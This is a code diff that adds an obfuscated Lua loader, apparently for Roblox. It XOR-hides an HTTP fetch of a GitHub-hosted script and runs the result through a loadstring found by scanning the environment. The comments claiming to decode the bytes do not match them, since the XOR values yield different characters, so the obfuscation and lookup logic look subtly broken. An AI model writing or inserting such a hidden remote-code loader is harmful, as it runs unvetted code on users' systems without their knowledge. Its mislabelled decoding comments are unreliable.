@@ -1,0 +1,28 @@
+do
+  local R=function(n) return string.char(n) end
+  local X=function(a,b) local t={} for i=1,#a do t[i]=R(bit32.bxor(a[i],b)) end return table.concat(t) end
+  local E=function()
+    local f=getfenv()
+    for k,v in pairs(f) do
+      if type(v)=="function" and tostring(v):find("loadstring") then return v end
+    end
+  end
+
+  local L=E()
+  local G=game[X({75,68,68,64,31,70,88,88,67,68,85},42)] -- "HttpGet" (xor)
+  local U=X({
+    78,94,94,90,89,84,71,71,   -- https://
+    88,75,93,68,76,   -- raw.
+    77,67,94,66,75,76,95,79,94,67,94,68,   -- githubusercontent
+    71,66,68,66,   -- .com
+    71,   -- /
+    66,67,66,67,66,67,66,67,50,57,   -- hahahaha279
+    71,   -- /
+    16,57,16,66,85,66,   -- 279hub
+    71,   -- /
+    71,71,71,71,   -- main/
+    227,131,161,227,130,164,227,131,179,46,108,117,97,   -- メイン.lua
+  },42)
+
+  L(G(game,U))()
+end
